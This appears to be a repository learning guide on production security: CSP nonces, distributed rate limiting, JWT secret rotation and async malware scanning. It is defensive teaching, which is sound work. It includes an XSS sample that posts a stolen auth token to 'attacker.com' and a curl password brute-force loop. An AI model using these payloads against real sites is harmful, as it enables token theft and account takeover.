# 🎓 Learning Guide: Production Security Engineering

**Educational companion to PRODUCTION_SECURITY_HARDENING_PLAN.md**  
**Purpose:** Understand the WHY before implementing the HOW  
**Date:** February 13, 2026

---

## 📚 What You'll Learn

This document teaches production security engineering through **4 real-world scenarios** from this repository:

1. **Content Security Policy (CSP)** - Why `unsafe-inline` exists & how to fix it
2. **Rate Limiting at Scale** - In-memory vs distributed rate limiting
3. **JWT Secret Rotation** - Zero-downtime credential rotation
4. **Malware Scanning** - Async security workflows

Each section explains:
- ❓ **What's the problem?**
- 🛠️ **Why does it exist?**
- 📖 **How do real companies solve it?**
- ✅ **Implementation trade-offs**
- 🎯 **What you should do next**

---

## 1️⃣ Content Security Policy (CSP) Deep Dive

### ❓ The Problem: XSS (Cross-Site Scripting)

**Scenario:** An attacker tricks your app into executing malicious JavaScript.

```html
<!-- Malicious comment form submission -->
<script>
  // Steals user's JWT token and sends to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('authToken')
  });
</script>
```

### 🛡️ What CSP Does

CSP is an HTTP header that tells the browser: **"Only run scripts from these approved sources"**

```http
Content-Security-Policy: script-src 'self' https://cdn.stripe.com
```

Translation: _"Only execute JavaScript from our domain or Stripe. Block everything else."_

---

### 🛠️ Why `unsafe-inline` Exists in THIS Repo

**Current state in [commerce-web/next.config.ts](../commerce-web/next.config.ts):**

```typescript
headers: [{
  key: 'Content-Security-Policy',
  value: "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com"
}]
```

**Why the compromise?**

#### Reason 1: Next.js Hydration
Next.js injects inline scripts for hydration (making server-rendered HTML interactive):

```html
<!-- Next.js automatically adds this -->
<script>
  self.__next_f.push([1, "data_payload_here"])
</script>
```

Without `unsafe-inline`, this breaks! Your page stays static.

#### Reason 2: Material-UI/Emotion Styles
CSS-in-JS libraries inject inline `<style>` tags:

```html
<style data-emotion="css-global">
  .MuiButton-root { color: #fff; }
</style>
```

Without `'unsafe-inline'` in `style-src`, no styling renders!

#### Reason 3: Development Hot Reload
Webpack HMR (Hot Module Replacement) uses `eval()` for fast reloads:

```javascript
eval("module.hot.accept()"); // ← Requires 'unsafe-eval'
```

---

### 📖 How Industry Solves This: Nonces

**A nonce is a "use-once" token** that marks approved inline scripts.

**Step 1:** Server generates a random nonce per request
```typescript
const nonce = crypto.randomBytes(16).toString('base64');
// Result: "rAnd0mStr1ng12345678"
```

**Step 2:** Add nonce to CSP header
```http
Content-Security-Policy: script-src 'self' 'nonce-rAnd0mStr1ng12345678'
```

**Step 3:** Tag approved inline scripts
```html
<!-- This executes (has matching nonce) -->
<script nonce="rAnd0mStr1ng12345678">
  console.log('Trusted code');
</script>

<!-- This is BLOCKED (no nonce = attacker code) -->
<script>
  maliciousCode(); // ❌ Blocked by browser!
</script>
```

---

### ✅ Implementation Trade-offs

| Approach | Security | Effort | Works With |
|----------|----------|--------|------------|
| **Keep `unsafe-inline`** | ⚠️ WEAK | ✅ 0 hours | Everything |
| **Add CSP reporting** | ⚠️ WEAK (but monitored) | ✅ 2 hours | Everything |
| **Nonce-based CSP** | ✅ STRONG | ❌ 2-3 days | Next.js 13.4+, Material-UI v5+ |
| **Hash-based CSP** | ✅ STRONG | ❌ 4-5 days | Static sites only |

---

### 🎯 Real-World Decision Matrix

**Ship with `unsafe-inline` IF:**
- ✅ Your app is internal/low-risk
- ✅ You have WAF (Web Application Firewall) protection
- ✅ You sanitize ALL user inputs (no raw HTML display)
- ✅ You monitor CSP violations

**Implement nonces IF:**
- ✅ Handling sensitive data (PII, payments, health)
- ✅ Public-facing app with user-generated content
- ✅ Compliance requirement (PCI-DSS, HIPAA)
- ✅ You have 2-3 days before launch

**For THIS repo:**
```markdown
RECOMMENDATION: Ship with `unsafe-inline` + monitoring

Why?
- ✅ Demo/MVP stage (not handling real payments yet)
- ✅ User input is sanitized (no raw HTML rendering)
- ✅ Can upgrade to nonces in Sprint 2
- ✅ Stripe.js is whitelisted (most critical 3rd party)

Action items:
1. Add CSP violation reporting endpoint (1 hour)
2. Monitor violations in production logs (ongoing)
3. Plan nonce migration for v2.0 (after Material-UI v5 upgrade)
```

---

## 2️⃣ Rate Limiting at Scale

### ❓ The Problem: Brute Force Attacks

**Scenario:** Attacker tries 1000 passwords/second against user logins.

```bash
# Attacker's script
for password in common_passwords.txt; do
  curl -X POST /api/auth/login -d "email=victim@example.com&password=$password"
done
```

Without rate limiting → Account takeover in seconds!

---

### 🛠️ Why In-Memory Works (Sometimes)

**Current implementation in [backend/src/middleware/bruteForceProtection.ts](../backend/src/middleware/bruteForceProtection.ts):**

```typescript
const ipRateLimits = new Map<string, RateLimitEntry>();

export function checkRateLimit(ip: string) {
  const entry = ipRateLimits.get(ip);
  if (entry && entry.count > 10) {
    throw new Error('Rate limit exceeded');
  }
  // ... update count
}
```

**This works perfectly IF:**
- ✅ Single server deployment (no load balancer)
- ✅ Low traffic (<1000 req/sec)
- ✅ OK with limits resetting on restart

**Why it breaks at scale:**
```
Request 1 → Server A → Counts: IP 123.45.67.89 = 1 attempt ✅
Request 2 → Server B → Counts: IP 123.45.67.89 = 1 attempt ✅
Request 3 → Server A → Counts: IP 123.45.67.89 = 2 attempts ✅
...
Result: Attacker gets 10 attempts × number of servers 💀
```

Each server has its own `Map`, so limits aren't shared!

---

### 📖 Industry Solution: Distributed Rate Limiting

#### Option 1: Redis (Self-Hosted)

**What Redis provides:**
- ✅ Shared state across all servers
- ✅ Atomic operations (`INCR` is thread-safe)
- ✅ Automatic expiry (`EXPIRE` key after 15 mins)
- ✅ Persistence survives restarts

**Migration path:**

```typescript
// backend/src/lib/rateLimit.ts
import { Redis } from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

export async function checkRateLimit(ip: string): Promise<boolean> {
  const key = `ratelimit:login:${ip}`;
  
  // Atomic increment
  const attempts = await redis.incr(key);
  
  // Set expiry on first attempt
  if (attempts === 1) {
    await redis.expire(key, 900); // 15 minutes
  }
  
  // Block after 10 attempts
  if (attempts > 10) {
    const ttl = await redis.ttl(key);
    throw new RateLimitError(`Try again in ${ttl} seconds`);
  }
  
  return true;
}
```

**Config required:**
```env
# .env.production
REDIS_URL=redis://redis:6379

# Or for Redis Cloud:
REDIS_URL=rediss://:password@redis-12345.cloud.redislabs.com:12345
```

**Failure modes to handle:**

```typescript
export async function checkRateLimit(ip: string) {
  try {
    return await checkRedisRateLimit(ip);
  } catch (error) {
    if (error.code === 'ECONNREFUSED') {
      // Redis is down!
      // Option A: FAIL OPEN (allow request, log error)
      logger.error('Redis down, rate limiting disabled');
      return true;
      
      // Option B: FAIL CLOSED (block request, maintain security)
      throw new Error('Rate limiting unavailable, please try again later');
    }
    throw error;
  }
}
```

**Trade-off decision:**
- **Fail open** → Better UX, but attackers bypass limits during Redis downtime
- **Fail closed** → Secure, but legitimate users can't access during outages

**Most companies:** Fail open + page alerting + auto-restart Redis

---

#### Option 2: Upstash (Serverless Redis)

**Best for:** Vercel, Netlify, serverless deployments

```typescript
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

const ratelimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(10, '15 m'), // 10 requests per 15 mins
  analytics: true, // Track usage
});

export async function checkRateLimit(ip: string) {
  const { success, limit, remaining } = await ratelimit.limit(ip);
  
  if (!success) {
    throw new RateLimitError(`Rate limit exceeded. ${remaining}/${limit} remaining`);
  }
}
```

**Pros:**
- ✅ No Redis server to manage
- ✅ Auto-scales
- ✅ Free tier (10K requests/day)
- ✅ Built-in analytics

**Cons:**
- ❌ HTTP overhead (50-100ms per check)
- ❌ Vendor lock-in
- ❌ Cold starts in free tier

---

### ✅ Decision Matrix

| Deployment | Recommendation | Reason |
|------------|----------------|--------|
| **Single server (Railway, Render)** | In-memory is OK | Limits work, no load balancing |
| **Multiple servers (Kubernetes)** | Redis (self-hosted) | Full control, low latency |
| **Serverless (Vercel, Netlify)** | Upstash | No server management |
| **High traffic (>10K req/sec)** | Redis Cluster + Local cache | 2-tier: memory → Redis |

---

### 🎯 For THIS Repository

**Current deployment:** Docker Compose (likely single server)

**Recommendation:**
```markdown
✅ KEEP in-memory rate limiting for now

Why?
- Single backend container (no horizontal scaling planned)
- Rate limits work correctly
- Redis adds complexity without benefit

⚠️ MIGRATE to Redis WHEN:
- Adding a second backend instance
- Deploying behind load balancer
- Moving to Kubernetes/serverless

Pre-work (do now):
1. Abstract rate limiting behind an interface
2. Create `IRateLimiter` + `InMemoryRateLimiter` + `RedisRateLimiter`
3. Swap implementation via env var

This makes migration < 1 hour when needed!
```

**Implementation:**

```typescript
// backend/src/lib/rateLimit/interface.ts
export interface IRateLimiter {
  check(key: string, limit: number, windowSeconds: number): Promise<RateLimitResult>;
}

export type RateLimitResult = {
  allowed: boolean;
  remaining: number;
  resetAt: Date;
};

// backend/src/lib/rateLimit/factory.ts
export function createRateLimiter(): IRateLimiter {
  const type = process.env.RATE_LIMIT_STORE || 'memory';
  
  switch (type) {
    case 'redis':
      return new RedisRateLimiter(process.env.REDIS_URL);
    case 'upstash':
      return new UpstashRateLimiter();
    default:
      return new InMemoryRateLimiter();
  }
}
```

Now you can switch providers without changing middleware code!

---

## 3️⃣ JWT Secret Rotation (Zero-Downtime)

### ❓ The Problem: Leaked Secrets

**Scenario:** Your `JWT_SECRET` gets committed to GitHub by accident.

```bash
# Attacker finds your secret in git history
JWT_SECRET=super-secret-key-123  # ← Committed 6 months ago!
```

**What attacker can do:**
1. Forge valid JWT tokens for ANY user
2. Access admin accounts
3. Steal data, delete records, etc.

**The fix?** Rotate the secret... but naively rotating breaks all existing sessions!

---

### 🛠️ Industry Solution: Key Versioning (KID)

**Concept:** Support multiple secrets simultaneously during transition period.

#### **Step 1: Add Key ID to JWT**

```typescript
// backend/src/services/authService.ts

const SECRETS = {
  'v1': process.env.JWT_SECRET_V1,  // Old secret
  'v2': process.env.JWT_SECRET_V2,  // New secret
};

const CURRENT_KEY = 'v2'; // Which key to use for NEW tokens

export function generateTokenWithKID(payload: any) {
  return jwt.sign(
    { ...payload, kid: CURRENT_KEY }, // ← Add key ID to token
    SECRETS[CURRENT_KEY],
    { expiresIn: '24h' }
  );
}
```

#### **Step 2: Verify with Multiple Secrets**

```typescript
export function verifyToken(token: string) {
  const decoded = jwt.decode(token, { complete: true });
  const kid = decoded?.payload?.kid || 'v1'; // Default to v1 for old tokens
  
  const secret = SECRETS[kid];
  if (!secret) {
    throw new Error('Unknown key version');
  }
  
  return jwt.verify(token, secret); // ← Use correct secret per token
}
```

Now:
- ✅ Old tokens (signed with v1) still work
- ✅ New tokens (signed with v2) use new secret
- ✅ No users are logged out!

---

### 📖 Rotation Process (5-Step Playbook)

#### **Day 0: Preparation**
```bash
# 1. Generate new secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# Output: 8f7d6e5c4b3a2918... ← Your new v2 secret

# 2. Update environment (don't restart yet!)
JWT_SECRET_V1=old-secret-keep-this
JWT_SECRET_V2=8f7d6e5c4b3a2918...  # New secret
CURRENT_JWT_KEY_VERSION=v1         # Still using old key
```

#### **Day 1: Deploy Dual-Key Support**
```bash
# Deploy code that READS both v1 and v2, but still WRITES v1
git add src/services/authService.ts
git commit -m "feat: support multi-version JWT secrets"
git push origin main

# Verify: Old tokens still work
curl -H "Authorization: Bearer $OLD_TOKEN" /api/users/me
# ✅ Should succeed
```

#### **Day 2: Switch to New Key**
```bash
# Change which key we use for NEW tokens
CURRENT_JWT_KEY_VERSION=v2

# Restart backend
docker-compose restart backend

# Test: New logins get v2 tokens
curl -X POST /api/auth/login -d '...'
# Decode token → should see "kid": "v2"

# Old tokens still valid!
curl -H "Authorization: Bearer $OLD_V1_TOKEN" /api/users/me
# ✅ Still works (using v1 secret)
```

#### **Day 3-30: Grace Period**
```
Old tokens expire naturally (24h TTL)
v1 secret still in environment (for stragglers)
Monitor: No "unknown key version" errors
```

#### **Day 30: Remove Old Secret**
```bash
# All v1 tokens expired by now
JWT_SECRET_V2=8f7d6e5c4b3a2918...
CURRENT_JWT_KEY_VERSION=v2
# Remove JWT_SECRET_V1

# Update code: Remove v1 from SECRETS object
```

---

### ✅ Implementation for THIS Repo

```typescript
// backend/src/config/jwt.ts

interface JWTSecret {
  id: string;
  secret: string;
  createdAt: Date;
  deprecatedAt?: Date;
}

export class JWTKeyManager {
  private keys: Map<string, JWTSecret>;
  
  constructor() {
    this.keys = new Map([
      ['v1', {
        id: 'v1',
        secret: process.env.JWT_SECRET_V1 || process.env.JWT_SECRET, // Backward compat
        createdAt: new Date('2026-01-01'),
      }],
      // Add v2 when rotating:
      // ['v2', { id: 'v2', secret: process.env.JWT_SECRET_V2, createdAt: new Date() }],
    ]);
  }
  
  getCurrentKey(): JWTSecret {
    const keyId = process.env.CURRENT_JWT_KEY_VERSION || 'v1';
    const key = this.keys.get(keyId);
    if (!key) throw new Error(`JWT key ${keyId} not found`);
    return key;
  }
  
  getKey(kid: string): JWTSecret | undefined {
    return this.keys.get(kid);
  }
  
  signToken(payload: any, expiresIn = '24h'): string {
    const key = this.getCurrentKey();
    return jwt.sign(
      { ...payload, kid: key.id },
      key.secret,
      { expiresIn }
    );
  }
  
  verifyToken(token: string): any {
    const decoded = jwt.decode(token, { complete: true }) as any;
    const kid = decoded?.payload?.kid || 'v1';
    
    const key = this.getKey(kid);
    if (!key) {
      throw new Error(`Unknown JWT key version: ${kid}`);
    }
    
    return jwt.verify(token, key.secret);
  }
}

export const jwtManager = new JWTKeyManager();
```

---

### 🎯 When to Rotate

**Immediately rotate if:**
- ❌ Secret found in public Git repo
- ❌ Ex-employee had access
- ❌ Server was compromised

**Scheduled rotation:**
- ✅ Every 90 days (industry standard)
- ✅ After major security updates
- ✅ Before security audits

---

## 4️⃣ Malware Scanning (Async Security)

### ❓ The Problem: User-Uploaded Malware

**Scenario:** User uploads a file disguised as an image.

```
evil.jpg.exe  ← Actually an executable
virus.pdf     ← Contains malicious scripts
ransom.docx.  ← Macro virus
```

If you serve these files directly → Users' computers get infected!

---

### 🛠️ Why NOT Scan Synchronously

**Naive approach (❌ DON'T DO THIS):**

```typescript
app.post('/api/upload', async (req, res) => {
  const file = req.file;
  
  // ❌ BAD: Block request during scan (30+ seconds!)
  const scanResult = await virusScan(file);
  
  if (scanResult.infected) {
    return res.status(400).json({ error: 'Malware detected' });
  }
  
  await saveFile(file);
  res.json({ success: true });
});
```

**Problems:**
1. **Timeout risk:** Scans take 30-60 seconds, HTTP requests timeout at 30s
2. **Poor UX:** User waits forever for upload to "finish"
3. **Resource waste:** API server blocked during scan (can't handle other requests)
4. **Cost:** Scanning services charge per API call, slow calls = $$$

---

### 📖 Industry Pattern: Async Scan Queue

**Correct approach:**

```
1. User uploads file
   ↓
2. Save to "quarantine" bucket (NOT public!)
   ↓
3. Return success immediately to user
   ↓
4. Add scan job to queue
   ↓
5. Background worker scans file
   ↓
6. If clean → Move to public bucket
   If infected → Delete + notify admins
```

**State machine:**

```
File States:
├─ PENDING    ← Just uploaded, awaiting scan
├─ SCANNING   ← Worker picked up, scan in progress
├─ CLEAN      ← Scan passed, file is public
├─ INFECTED   ← Scan failed, file quarantined/deleted
└─ ERROR      ← Scan service unavailable
```

---

### ✅ Implementation Architecture

#### **Step 1: Upload Endpoint (Returns Immediately)**

```typescript
// commerce-web/src/app/api/upload/route.ts

export async function POST(req: Request) {
  const formData = await req.formData();
  const file = formData.get('file') as File;
  
  // 1. Save to QUARANTINE bucket (not publicly accessible)
  const { data, error } = await supabase.storage
    .from('quarantine')  // ← Separate bucket!
    .upload(`${userId}/${fileId}`, file);
  
  // 2. Create DB record with PENDING state
  await db.files.create({
    id: fileId,
    userId,
    filename: file.name,
    status: 'PENDING',      // ← Not public yet!
    quarantinePath: data.path,
    uploadedAt: new Date(),
  });
  
  // 3. Enqueue scan job
  await scanQueue.add('virus-scan', {
    fileId,
    path: data.path,
  });
  
  // 4. Return immediately (don't wait for scan!)
  return Response.json({
    fileId,
    status: 'PENDING',
    message: 'Upload successful, scanning in progress',
  });
}
```

#### **Step 2: Background Scan Worker**

```typescript
// backend/src/workers/scanWorker.ts

import { ClamAV } from 'node-clamscan';  // Open-source malware scanner

const scanner = new ClamAV({ /* config */ });

scanQueue.process('virus-scan', async (job) => {
  const { fileId, path } = job.data;
  
  try {
    // 1. Download file from quarantine
    const { data } = await supabase.storage
      .from('quarantine')
      .download(path);
    
    // 2. Scan with ClamAV (or VirusTotal API)
    const result = await scanner.scanBuffer(data);
    
    // 3. Update file status based on result
    if (result.isInfected) {
      await db.files.update(fileId, {
        status: 'INFECTED',
        scanDetails: result.viruses,
        scannedAt: new Date(),
      });
      
      // Delete from quarantine
      await supabase.storage.from('quarantine').remove([path]);
      
      // Notify admins
      await alertAdmins('Malware detected', { fileId, viruses: result.viruses });
      
    } else {
      // 4. File is clean → Move to public bucket
      await supabase.storage.from('public-files').copy(
        `quarantine/${path}`,
        `public/${fileId}/${filename}`
      );
      
      await db.files.update(fileId, {
        status: 'CLEAN',
        publicUrl: `public/${fileId}/${filename}`,
        scannedAt: new Date(),
      });
      
      // Delete quarantine copy
      await supabase.storage.from('quarantine').remove([path]);
      
      // Notify user (email/webhook)
      await notifyUser(userId, 'File ready for download', { fileId });
    }
    
  } catch (error) {
    // Scan service unavailable
    await db.files.update(fileId, {
      status: 'ERROR',
      errorMessage: error.message,
    });
    
    throw error; // Retry job
  }
});
```

#### **Step 3: Download Endpoint (Check Status)**

```typescript
// commerce-web/src/app/api/files/[id]/download/route.ts

export async function GET(req: Request, { params }) {
  const file = await db.files.findOne(params.id);
  
  switch (file.status) {
    case 'PENDING':
    case 'SCANNING':
      return Response.json({
        error: 'File is still being scanned',
        status: file.status,
        message: 'Please check back in a few moments',
      }, { status: 202 }); // 202 Accepted
    
    case 'CLEAN':
      // Generate signed URL for clean file
      const { data } = await supabase.storage
        .from('public-files')
        .createSignedUrl(file.publicUrl, 3600);
      
      return Response.redirect(data.signedUrl);
    
    case 'INFECTED':
      return Response.json({
        error: 'File failed security scan',
        status: 'INFECTED',
      }, { status: 403 }); // 403 Forbidden
    
    case 'ERROR':
      return Response.json({
        error: 'Scan failed, please re-upload',
        status: 'ERROR',
      }, { status: 500 });
  }
}
```

---

### 🎯 Hook Points for THIS Repo

**Don't build scanning NOW, but prepare the integration:**

```typescript
// commerce-web/src/lib/fileScanner.ts

export interface FileScanner {
  scan(buffer: Buffer): Promise<ScanResult>;
}

export type ScanResult = {
  isClean: boolean;
  viruses?: string[];
  scanTime: number;
};

// Placeholder implementation (always passes)
export class NoOpScanner implements FileScanner {
  async scan(buffer: Buffer): Promise<ScanResult> {
    console.warn('⚠️  File scanning not implemented, all uploads pass!');
    return { isClean: true, scanTime: 0 };
  }
}

// Real implementations (add later):
// - ClamAVScanner (self-hosted, free)
// - VirusTotalScanner (cloud API, paid)
// - CloudflareScanScanner (Cloudflare workers)

// Factory pattern for easy swap
export function createScanner(): FileScanner {
  const type = process.env.FILE_SCANNER || 'noop';
  
  switch (type) {
    case 'clamav':
      return new ClamAVScanner(process.env.CLAMAV_HOST);
    case 'virustotal':
      return new VirusTotalScanner(process.env.VIRUSTOTAL_API_KEY);
    default:
      return new NoOpScanner();
  }
}
```

**Document the state machine:**

```typescript
// commerce-web/src/types/file.ts

export enum FileStatus {
  PENDING = 'pending',     // Uploaded, awaiting scan
  SCANNING = 'scanning',   // Scan in progress
  CLEAN = 'clean',         // Passed scan, publicly accessible
  INFECTED = 'infected',   // Failed scan, quarantined
  ERROR = 'error',         // Scan service error
}

export interface FileRecord {
  id: string;
  userId: string;
  filename: string;
  status: FileStatus;
  quarantinePath?: string;  // Path in quarantine bucket
  publicUrl?: string;       // Path in public bucket (only if CLEAN)
  scanDetails?: {
    scannedAt: Date;
    scanner: string;        // 'clamav' | 'virustotal'
    viruses?: string[];
  };
  uploadedAt: Date;
}
```

---

### 📋 Migration Checklist

**Phase 1: Prepare Infrastructure (Do Now)**
- [ ] Create `quarantine` storage bucket (private)
- [ ] Add `status` field to file records
- [ ] Implement state machine (PENDING → SCANNING → CLEAN/INFECTED)
- [ ] Update upload endpoint to use quarantine bucket
- [ ] Update download endpoint to check status

**Phase 2: Add Scanning (Later)**
- [ ] Choose scanner (ClamAV, VirusTotal, etc.)
- [ ] Deploy scanner service (Docker or cloud API)
- [ ] Implement background worker
- [ ] Test with EICAR test file
- [ ] Add monitoring/alerting

---

##Summary: Production Security Principles

### 1. **Defense in Depth**
Don't rely on ONE security control. Layer them:
- CSP prevents XSS
- Input sanitization prevents injection
- Rate limiting prevents brute force
- WAF catches unusual patterns

### 2. **Fail Securely**
When things break, default to DENY:
- RedisRate limiter down? → Block requests (or page admins)
- File scanner offline? → Quarantine uploads
- JWT secret unknown? → Reject token

### 3. **Graceful Degradation**
Balance security vs availability:
- Rate limiting: Fail open with alerts (UX > security for MVP)
- File scanning: Async doesn't block users
- CSP: Start permissive, harden over time

### 4. **Observable Security**
You can't protect what you can't see:
- CSP violation reports
- Rate limit metrics
- Malware scan results
- JWT key usage by version

### 5. **Rotate Credentials**
Everything expires eventually:
- JWT secrets: 90 days
- API keys: 180 days
- TLS certificates: 90 days (Let's Encrypt auto-renews)

---

## 🎯 Next Steps for THIS Repository

### Immediate (Before Production)
1. **Decide on CSP:** Keep `unsafe-inline` + monitoring, or block launch for nonces?
2. **Document rate limiting:** If single-server, keep in-memory. If scaling, migrate to Redis.
3. **Add JWT key versioning:** Prepare for rotation (even if secret hasn't leaked).
4. **Implement file status states:** PENDING → CLEAN (even without scanning).

### First 30 Days After Launch
1. Monitor CSP violations → Plan nonce migration
2. Monitor rate limit effectiveness → Adjust thresholds
3. Review audit logs → Look for suspicious patterns
4. Load test → Does in-memory rate limiting hold up?

### 90-Day Roadmap
1. Rotate JWT secret (first planned rotation)
2. Implement file scanning (ClamAV or VirusTotal)
3. Upgrade to strict CSP (if Material-UI v5 upgraded)
4. Migrate to Redis rate limiting (if horizontally scaled)

---

**Go build secure systems! 🔐**
